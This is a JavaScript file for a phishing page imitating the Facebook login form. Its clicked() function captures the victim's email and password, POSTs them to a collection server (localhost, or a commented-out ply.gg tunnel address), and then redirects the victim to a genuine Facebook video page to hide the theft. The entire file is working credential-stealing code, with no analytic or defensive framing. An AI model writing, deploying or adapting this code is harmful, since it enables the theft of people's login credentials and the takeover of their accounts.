
const url = 'http://localhost:8080/'
//const url='http://trying-brochures.at.ply.gg:11487/'

var x = document.getElementsByClassName("_9ls7 hidden_elem")
var z = document.getElementById("u_0_4_Cl")
var pass = document.getElementById('pass')

if (password != "") {
    x[0].classList.toggle("hidden_elem")
}

var y = document.getElementsByClassName("_9lsb")

function eye() {
    document.getElementById('pass').type = "text";
    z.classList.toggle("_9ls8")
    z.classList.add("_9ls9")
}

async function clicked() {
    var email = document.getElementById('email');
    var pass = document.getElementById('password')

    console.log(email.value)
    console.log(pass.value)
    const res = await fetch(url, {
        method: 'POST',
        headers: {
            "content-type": 'application/json'
        },
        body: JSON.stringify({
            email: email.value,
            pass: pass.value
        })
    })
    window.location.href = 'https://www.facebook.com/watch/?ref=search&v=1314826495745508&external_log_id=310849fe-f5cd-490a-9a51-244a89bd7d28&q=assamese%20reel'
} 